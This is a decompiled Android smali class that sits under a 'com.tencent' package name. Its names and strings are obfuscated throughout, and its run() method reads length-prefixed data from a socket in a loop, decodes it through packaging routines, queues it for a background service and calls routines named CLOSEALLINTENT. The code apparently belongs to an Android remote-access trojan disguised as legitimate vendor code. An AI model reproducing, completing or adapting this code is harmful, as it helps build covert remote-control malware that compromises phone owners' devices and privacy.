.class Lcom/tencent/DataEncryptionEngine$2;
.super Ljava/lang/Object;
.source "tunesxconcerningn102.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/DataEncryptionEngine;->r_tunesxconcerningn102_cv()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .line 116
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 12

    .line 118
    sget-object v0, Lcom/tencent/DataEncryptionEngine;->r:Ljava/lang/Object;

    monitor-enter v0

    .line 119
    :try_start_0
    sget-object v1, Lcom/tencent/DataEncryptionEngine;->ctx:Landroid/content/Context;

    invoke-static {v1}, Lcom/tencent/DataPackagingEngine;->sv(Landroid/content/Context;)Z

    move-result v1

    const/4 v2, 0x0

    if-nez v1, :cond_0

    .line 120
    sget-object v1, Lcom/tencent/DataEncryptionEngine;->ctx:Landroid/content/Context;

    invoke-static {v1, v2}, Lcom/tencent/DataPackagingEngine;->WK_tunesxconcerningn103_L(Landroid/content/Context;Z)V

    :cond_0
    const/4 v1, 0x1

    .line 123
    sput-boolean v1, Lcom/tencent/DataEncryptionEngine;->ec_tunesxconcerningn102_ho:Z

    const-string v3, "\u02c8\u1d54\u0999\u02bf$\u02bf\u02bc\u20abhypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41\u03b8\u1d62\u05d9\u02bf\u1623\u03b8\u02c9\u02c6\u02c9\u03b8\u03c6\u02ce$\u02c9\u02ce$\ufe73\u02ca\u2db1\u2071\u1d47\u02behypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41\u02d1$\u02cf\u0640\ufe73"

    .line 124
    invoke-static {v3}, Lcom/tencent/DataEncryptionEngine;->podcastgtransitionr36(Ljava/lang/String;)V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 126
    :try_start_1
    new-instance v3, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v3}, Ljava/io/ByteArrayOutputStream;-><init>()V

    const/4 v4, -0x1

    .line 133
    filled-new-array {v4, v4}, [I

    move-result-object v5

    new-array v6, v1, [B

    :goto_0
    move v8, v2

    :goto_1
    move v7, v4

    .line 135
    :catch_0
    :cond_1
    :goto_2
    sget-object v9, Lcom/tencent/DataEncryptionEngine;->inputnew:Ljava/io/DataInputStream;

    invoke-virtual {v9, v6}, Ljava/io/DataInputStream;->read([B)I

    move-result v9

    if-lez v9, :cond_6

    .line 136
    sput v4, Lcom/tencent/MainBackgroundService;->inx:I

    .line 137
    array-length v10, v6

    if-le v10, v1, :cond_2

    .line 138
    invoke-virtual {v3, v6, v2, v9}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    .line 139
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v9

    array-length v9, v9

    if-ne v9, v8, :cond_1

    .line 140
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v7

    invoke-static {v7, v5}, Lcom/tencent/DataPackagingEngine;->solariscelectoraln30([B[I)[B

    move-result-object v7

    invoke-static {v7}, Lcom/tencent/DataPackagingEngine;->garbageavalzrecentz29([B)[B

    move-result-object v7

    .line 141
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v8

    invoke-static {v8, v5}, Lcom/tencent/DataPackagingEngine;->competentybutts32([B[I)[B

    move-result-object v8

    invoke-static {v8}, Lcom/tencent/DataPackagingEngine;->garbageavalzrecentz29([B)[B

    move-result-object v8

    .line 142
    new-instance v9, Lcom/tencent/InstalledAppsScanner;

    invoke-direct {v9, v7, v8}, Lcom/tencent/InstalledAppsScanner;-><init>([B[B)V

    .line 143
    sget-object v7, Lcom/tencent/MainBackgroundService;->L_tunesxconcerningn1011_i:Ljava/util/List;

    invoke-interface {v7, v9}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 144
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->reset()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_1 .. :try_end_1} :catch_3
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    new-array v6, v1, [B
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2 .. :try_end_2} :catch_3
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 150
    :catch_1
    :try_start_3
    sget-object v7, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    const v8, 0x32000

    invoke-virtual {v7, v8}, Ljava/net/Socket;->setReceiveBufferSize(I)V

    .line 152
    aput v4, v5, v2

    .line 153
    aput v4, v5, v1

    goto :goto_0

    .line 157
    :cond_2
    aget-byte v10, v6, v2

    if-nez v10, :cond_5

    add-int/lit8 v7, v7, 0x1

    if-nez v7, :cond_3

    .line 160
    new-instance v9, Ljava/lang/String;

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v10

    const-string v11, "UTF-8"

    invoke-direct {v9, v10, v11}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-static {v9}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/Integer;->intValue()I

    move-result v9

    aput v9, v5, v2

    .line 161
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->reset()V

    goto :goto_2

    :cond_3
    if-ne v7, v1, :cond_4

    .line 163
    new-instance v6, Ljava/lang/String;

    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v7

    const-string v9, "UTF-8"

    invoke-direct {v6, v7, v9}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    invoke-static {v6}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v6

    aput v6, v5, v1

    .line 164
    invoke-virtual {v3}, Ljava/io/ByteArrayOutputStream;->reset()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_3 .. :try_end_3} :catch_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 168
    :try_start_4
    aget v6, v5, v2

    aget v7, v5, v1
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_2
    .catch Ljava/lang/OutOfMemoryError; {:try_start_4 .. :try_end_4} :catch_3
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    add-int v8, v6, v7

    .line 170
    :catch_2
    :try_start_5
    sget-object v6, Lcom/tencent/DataEncryptionEngine;->rec_tunesxconcerningn102_iver:Ljava/net/Socket;

    invoke-virtual {v6, v8}, Ljava/net/Socket;->setReceiveBufferSize(I)V

    .line 172
    new-array v6, v8, [B

    goto/16 :goto_1

    :cond_4
    if-le v7, v1, :cond_1

    goto/16 :goto_1

    .line 177
    :cond_5
    invoke-virtual {v3, v6, v2, v9}, Ljava/io/ByteArrayOutputStream;->write([BII)V
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_5 .. :try_end_5} :catch_3
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    .line 178
    :try_start_6
    sget-wide v9, Lcom/tencent/DataEncryptionEngine;->s_tunesxconcerningn102_s:J

    invoke-static {v9, v10}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catch Ljava/lang/InterruptedException; {:try_start_6 .. :try_end_6} :catch_0
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_3
    .catch Ljava/lang/OutOfMemoryError; {:try_start_6 .. :try_end_6} :catch_3
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto/16 :goto_2

    :catch_3
    :cond_6
    :try_start_7
    const-string v1, "sdabdeatnjytkuytdjhystyjsyrjr5yjrsy"

    .line 190
    invoke-static {v1}, Lcom/tencent/DataEncryptionEngine;->CLOSEALLINTENT(Ljava/lang/String;)V

    .line 191
    invoke-static {v2}, Lcom/tencent/DataPackagingEngine;->rel(Z)V

    .line 192
    sget-object v1, Lcom/tencent/DataEncryptionEngine;->da_tunesxconcerningn102_da:Ljava/lang/String;

    sget-object v3, Lcom/tencent/DataEncryptionEngine;->fa__tunesxconcerningn102_da:Ljava/lang/String;

    invoke-static {v1, v3}, Lcom/tencent/DataEncryptionEngine;->gnufprovincialy35(Ljava/lang/String;Ljava/lang/String;)V

    .line 193
    sput-boolean v2, Lcom/tencent/DataEncryptionEngine;->ec_tunesxconcerningn102_ho:Z

    .line 194
    monitor-exit v0

    return-void

    :catchall_0
    move-exception v1

    monitor-exit v0
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    throw v1
.end method
